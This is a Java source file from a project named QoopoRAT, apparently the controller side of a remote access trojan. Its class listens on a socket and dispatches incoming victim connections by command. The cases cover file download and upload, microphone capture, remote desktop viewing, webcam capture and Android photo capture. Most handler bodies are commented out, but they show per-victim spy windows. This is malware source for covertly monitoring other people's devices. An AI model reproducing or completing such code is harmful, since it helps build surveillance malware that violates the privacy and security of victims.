/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooporat.android;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import qooporat.utilidades.Protocolo;
/**
 *
 * @author alberto
 */
public class ConexionArchivos extends Thread {
    private ServerSocket p_escucha;
    private Socket p_conexion;
    private QoopoRAT cliente;
    public boolean CONECTADO = true;
    public ConexionArchivos(int puerto, int cola, QoopoRAT contenedor) throws IOException {
        this.p_escucha = new ServerSocket(puerto, cola);
        cliente = contenedor;
        CONECTADO = true;
    }
    @Override
    public void run() {
        do {
            try {
                while (true) {
                    this.p_conexion = this.p_escucha.accept();
                    ObjectInputStream in = new ObjectInputStream(this.p_conexion.getInputStream());
                    ObjectOutputStream out = new ObjectOutputStream(this.p_conexion.getOutputStream());
                    int comando = in.readInt();
                    switch (comando) {
                        case Protocolo.descargar:
//                            DescargaArchivo ds = new DescargaArchivo(in,cliente);
//                            QoopoRAT.paneDescarga.setCaretPosition(QoopoRAT.paneDescarga.getDocument().getLength());
//                            QoopoRAT.paneDescarga.insertComponent(ds);
//                            QoopoRAT.listaDescargas.add(ds);
//                            try {
//                                QoopoRAT.paneDescarga.getDocument().insertString(QoopoRAT.paneDescarga.getDocument().getLength(), "\n", null);
//                            } catch (BadLocationException ex) {
//                                Logger.getLogger(ConexionArchivos.class.getName()).log(Level.SEVERE, null, ex);
//                            }
////                            ds.run();
//                            new Thread(ds).start();
                            break;
                        case Protocolo.subir:
//                            String archivoAsubir = Servidor.leerCadena((byte[]) in.readObject());
//                            SubirArchivo sa = new SubirArchivo(out, archivoAsubir);
//                            QoopoRAT.paneDescarga.setCaretPosition(QoopoRAT.paneDescarga.getDocument().getLength());
//                            QoopoRAT.paneDescarga.insertComponent(sa);
//                            QoopoRAT.listaSubidas.add(sa);
//                            try {
//                                QoopoRAT.paneDescarga.getDocument().insertString(QoopoRAT.paneDescarga.getDocument().getLength(), "\n", null);
//                            } catch (BadLocationException ex) {
//                                Logger.getLogger(ConexionArchivos.class.getName()).log(Level.SEVERE, null, ex);
//                            }
////                            sa.run();
//                            new Thread(sa).start();
                            break;
                        case Protocolo.audio:
//                            String ID = Servidor.leerCadena((byte[]) in.readObject());
//                            Servidor servidor = (Servidor) QoopoRAT.servidores.get(ID);
//                            Microfono ven = (Microfono) QoopoRAT.capturasAudio.get(ID);
//                            if (ven == null) {
//                                ven = new Microfono(in, cliente, servidor);
//                                new Thread(ven).start();
////                                ven.run();
//                                ven.setAndroid(false);
//                                ven.setVisible(true);
//                                ven.setLocation(100, 100);
//                                ven.setTitle("Captura de Microfono [" + servidor.getInformacion() + "]");
//                                QoopoRAT.capturasAudio.put(ID, ven);
//                            } else {
//                                if (!ven.isVisible()) {
//                                    ven.setVisible(true);
//                                }
//                                ven.setAndroid(false);
//                                ven.setRecibirObjeto(in);
//                                ven.setTitle("Captura de Microfono [" + servidor.getInformacion() + "]");
////                                ven.run();
//                                new Thread(ven).start();
//                            }
                            break;
                        case Protocolo.audioAndroid:
//                            String idAndroid = Servidor.leerCadena((byte[]) in.readObject());
//                            Servidor servAudio = (Servidor) QoopoRAT.servidores.get(idAndroid);
//                            Microfono venMicAndroid = (Microfono) QoopoRAT.capturasAudio.get(idAndroid);
//                            if (venMicAndroid == null) {
//                                venMicAndroid = new Microfono(in, cliente, servAudio);
//                                new Thread(venMicAndroid).start();
////                                ven.run();
//                                venMicAndroid.setAndroid(true);
//                                venMicAndroid.setVisible(true);
//                                venMicAndroid.setLocation(100, 100);
//                                venMicAndroid.setTitle("Captura de Microfono [" + servAudio.getInformacion() + "]");
//                                QoopoRAT.capturasAudio.put(idAndroid, venMicAndroid);
//                            } else {
//                                if (!venMicAndroid.isVisible()) {
//                                    venMicAndroid.setVisible(true);
//                                }
//                                venMicAndroid.setAndroid(true);
//                                venMicAndroid.setRecibirObjeto(in);
//                                venMicAndroid.setTitle("Captura de Microfono [" + servAudio.getInformacion() + "]");
////                                ven.run();
//                                new Thread(venMicAndroid).start();
//                            }
                            break;
                        case Protocolo.capturaPantalla:
//                            String IDPantalla = Servidor.leerCadena((byte[]) in.readObject());
//                            Servidor servidorPantalla = (Servidor) QoopoRAT.servidores.get(IDPantalla);
//                            EscritorioRemoto er = (EscritorioRemoto) QoopoRAT.capturasEscritorio.get(IDPantalla);
//                            if (er == null) {
//                                er = new EscritorioRemoto(in, cliente, servidorPantalla);
//                                new Thread(er).start();
////                                er.run();
//                                er.setVisible(true);
//                                er.setLocation(100, 100);
//                                er.setTitle("Escritorio Remoto [" + servidorPantalla.getInformacion() + "]");
//                                QoopoRAT.capturasEscritorio.put(IDPantalla, er);
//                            } else {
//                                if (!er.isVisible()) {
//                                    er.setVisible(true);
//                                }
//                                er.setTitle("Escritorio Remoto  [" + servidorPantalla.getInformacion() + "]");
//                                er.setRecibirObjeto(in);
////                                er.run();
////                                new Thread(er).start();
//                            }
                            break;
                        case Protocolo.capturaWebCam:
//                            String idWebCam = Servidor.leerCadena((byte[]) in.readObject());
//                            Servidor servWC = (Servidor) QoopoRAT.servidores.get(idWebCam);
//                            Camara wc = (Camara) QoopoRAT.capturasWebCam.get(idWebCam);
//                            if (wc == null) {
//                                wc = new Camara(in, cliente, servWC);
//                                new Thread(wc).start();
////                                er.run();
//                                wc.setVisible(true);
//                                wc.setLocation(100, 100);
//                                wc.setTitle("WebCam Remoto [" + servWC.getInformacion() + "]");
//                                QoopoRAT.capturasWebCam.put(idWebCam, wc);
//                            } else {
//                                if (!wc.isVisible()) {
//                                    wc.setVisible(true);
//                                }
//                                wc.setRecibirObjeto(in);
//                                wc.setTitle("WebCam Remoto  [" + servWC.getInformacion() + "]");
////                                wc.run();
////                                new Thread(wc).start();
//                            }
                            break;
                        case Protocolo.androidFoto:
//                            String idFoto = Servidor.leerCadena((byte[]) in.readObject());
//                            Servidor servFoto = (Servidor) QoopoRAT.servidores.get(idFoto);
//                            Camara wcFoto = (Camara) QoopoRAT.capturasWebCam.get(idFoto);
//                            if (wcFoto == null) {
//                                wcFoto = new Camara(in, cliente, servFoto);
//                                wcFoto.setAndroid(true);
//                                new Thread(wcFoto).start();
////                                er.run();
//                                wcFoto.setVisible(true);
//                                wcFoto.setLocation(100, 100);
//                                wcFoto.setTitle("WebCam Remoto [" + servFoto.getInformacion() + "]");
//                                QoopoRAT.capturasWebCam.put(idFoto, wcFoto);
//                            } else {
//                                if (!wcFoto.isVisible()) {
//                                    wcFoto.setVisible(true);
//                                }
//                                wcFoto.setRecibirObjeto(in);
//                                wcFoto.setAndroid(true);
//                                wcFoto.setTitle("WebCam Remoto  [" + servFoto.getInformacion() + "]");
//                            }
                            break;
                    }
                }
            } catch (IOException ex) {
            }
        } while (CONECTADO);
    }
    public void stopPara() {
        CONECTADO = false;
        try {
            this.p_escucha.close();
        } catch (IOException ex) {
        }
    }
    public ServerSocket getP_escucha() {
        return p_escucha;
    }
    public void setP_escucha(ServerSocket p_escucha) {
        this.p_escucha = p_escucha;
    }
    public Socket getP_conexion() {
        return p_conexion;
    }
    public void setP_conexion(Socket p_conexion) {
        this.p_conexion = p_conexion;
    }
    public QoopoRAT getCliente() {
        return cliente;
    }
    public void setCliente(QoopoRAT cliente) {
        this.cliente = cliente;
    }
}
